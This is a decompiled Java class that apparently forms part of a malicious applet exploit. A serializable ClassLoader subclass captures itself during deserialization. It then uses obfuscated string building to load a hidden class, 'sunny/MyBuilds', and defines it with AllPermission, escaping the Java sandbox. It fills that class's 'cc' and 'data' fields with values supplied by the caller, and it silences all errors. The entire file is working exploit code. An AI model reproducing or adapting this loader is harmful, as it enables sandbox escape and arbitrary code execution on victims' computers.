// 
// Decompiled by Procyon v0.5.30
// 

package sunny;

import java.security.Permission;
import java.security.AllPermission;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.lang.reflect.Field;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class MyFiles extends ClassLoader implements Serializable
{
    public static MyFiles instance;
    private static final long serialVersionUID = 6812622870313961944L;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        MyFiles.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void __o(final String s, final String s2) throws IOException {
        final int n = 8192;
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[n];
            int read;
            while ((read = this.getClass().getResourceAsStream("k/k".replace("k", "") + "sTTTTunTTTny".replace("T", "").replace("nn.".replace("n", ""), "RR/RR".replace("R", "")) + "rrrr/rrrrrrMyBuildsrrrr.clrrrass".replace("r", "")).read(array)) > 0) {
                byteArrayOutputStream.write(array, 0, read);
            }
            final Class minitClass = this.minitClass(byteArrayOutputStream.toByteArray());
            if (minitClass != null) {
                final Field field = minitClass.getField("ccmmmm".replace("m", ""));
                final Field field2 = minitClass.getField("mmdmmammtma".replace("m", ""));
                final Object instance = minitClass.newInstance();
                field.set(instance, s2);
                field2.set(instance, s);
                minitClass.newInstance();
            }
        }
        catch (Exception ex) {}
    }
    
    public Class minitClass(final byte[] array) throws IOException {
        final int n = 0;
        final URL url = new URL("ficle:/ccc/cccc/".replace("c", ""));
        final Certificate[] array2 = new Certificate[n];
        final Permissions permissions = new Permissions();
        this.AddPerm(permissions);
        return this.defineClass("sunny.MyBuilds", array, n, array.length, new ProtectionDomain(new CodeSource(url, array2), permissions));
    }
    
    public void AddPerm(final Permissions permissions) {
        permissions.add(new AllPermission());
    }
    
    static {
        MyFiles.instance = null;
    }
}
